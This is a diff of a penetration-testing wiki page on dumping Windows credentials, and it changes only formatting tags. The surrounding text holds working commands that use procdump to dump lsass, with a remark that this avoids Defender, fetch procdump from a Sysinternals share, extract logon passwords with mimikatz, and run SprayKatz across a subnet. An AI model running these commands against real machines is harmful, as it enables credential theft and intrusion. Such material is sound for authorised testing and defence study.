@@ -79,7 +79,7 @@ mimikatz_command -f "lsadump::sam"
 As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, it's not detected by Defender.\
 You can use this tool to **dump the lsass process**, **download the dump** and **extract** the **credentials locally** from the dump.
 
-{% code title="Dump lsass" %}
+
 ```bash
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -87,16 +87,16 @@ C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
-{% endcode %}
 
-{% code title="Extract credentials from the dump" %}
+
+
 ```c
 //Load the dump
 mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-{% endcode %}
+
 
 This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
